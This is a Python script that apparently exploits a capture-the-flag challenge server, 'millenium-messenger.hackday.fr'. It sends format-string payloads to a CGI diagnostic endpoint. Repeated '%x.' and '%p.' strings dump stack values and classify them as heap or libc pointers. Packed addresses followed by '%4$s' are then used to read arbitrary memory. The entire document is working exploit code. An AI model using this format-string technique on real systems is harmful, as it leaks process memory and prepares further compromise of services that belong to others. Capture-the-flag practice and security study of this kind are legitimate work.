#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time
import re

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg(body_str):
    encoded = urllib.parse.quote(body_str, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode('latin-1', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

# Get a hex dump of many stack positions
print("=== Dump 200 stack values as hex ===")
result = send_msg("%x." * 200)
# Parse the hex values
diag_start = result.find("DIAG ") + 5
hex_vals = result[diag_start:].strip().split('.')
hex_vals = [v for v in hex_vals if v and v != '0' and v != '(nil)']
print(f"Got {len(hex_vals)} non-zero values")
for i, v in enumerate(hex_vals):
    try:
        val = int(v, 16)
        print(f"  [{i}] 0x{val:08x}")
    except:
        pass

print()
print("=== Key addresses that look like heap pointers ===")
# Heap addresses on 32-bit Linux are typically 0x08800000 - 0x09ffffff range
# or near the binary's end 

# Let's look at all addresses from the dump that might point to heap
result2 = send_msg("%p." * 200)
diag_start = result2.find("DIAG ") + 5
all_ptrs = result2[diag_start:].strip().split('.')

heap_candidates = []
for i, p in enumerate(all_ptrs):
    p = p.strip()
    if not p or p == '(nil)':
        continue
    try:
        val = int(p, 16)
        # Heap region on 32-bit ELF
        if 0x08048000 <= val <= 0x0fffffff:
            heap_candidates.append((i, val))
            print(f"  [{i}] 0x{val:08x} (code/data/heap)")
        elif 0xf7000000 <= val <= 0xffffffff:
            heap_candidates.append((i, val))
            print(f"  [{i}] 0x{val:08x} (libc/stack)")
    except:
        pass

print()
print("=== Try reading strings at each candidate address ===")
for i, addr in heap_candidates:
    addr_bytes = struct.pack('<I', addr)
    payload = addr_bytes + b'%4$s'
    raw = send_msg_raw(payload)
    
    diag_pos = raw.find(b'DIAG ')
    if diag_pos >= 0:
        content = raw[diag_pos+5:].rstrip(b'\r\n')
        if content and content != b'(null)' and len(content) > 2:
            try:
                text = content.decode('ascii')
                if all(32 <= ord(c) < 127 for c in text) and len(text) > 3:
                    print(f"  [{i}] 0x{addr:08x} -> {repr(text[:100])}")
            except:
                try:
                    print(f"  [{i}] 0x{addr:08x} -> raw: {repr(content[:32])}")
                except:
                    pass
    time.sleep(0.05)
